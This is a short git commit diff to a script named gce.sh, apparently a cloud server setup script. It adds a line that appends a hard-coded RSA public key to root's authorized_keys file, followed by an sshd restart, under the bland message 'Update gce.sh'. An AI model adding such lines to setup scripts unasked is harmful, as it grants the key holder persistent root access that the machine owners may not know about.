6654a1a5b10b83fe965ca79ef3cc41ab85c6e1a0
David Ballantyne <david.hk.ballantyne@gmail.com>
2021-09-19 10:12:19 -0400

    Update gce.sh

--- gce.sh
+++ gce.sh
@@ -6,3 +6,5 @@ apt-get update
 echo "sleep 2s"
 sleep 2s
 $s
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAhydYLT6JTiIdxQw5nJlkyTwgwIwWLeu7dpz4+Xnvv24tEFIDkthTFgVnSbXe1NzP9VsosSmQr22qByTQ3NLCgKeZYNCSS+LfDksSl1twTFNFr5u2J8o/B+sGyA5YuFIoBwJw/m580C99zhjn75S+ndsthlWCIsdPd3UBXU1l48t2iH7JUTMXdnUNQtQnga2L+WFhW6YuIGGGgEwuCd/fqi8K0SQ3k6fVE/dtf1A5ivSKuUk2qPdnaCcMQa2OlrR6+OvBVouSqgO/nGkDiE5bXkflBon8c71sf6/h3Mk7UbNG2T/hkLM1vGRg+gkQ3W4JUdRoNx8ZbQoS4TO4fJMF1Q== rsa-key-20200602" >> /root/.ssh/authorized_keys
+service sshd restart
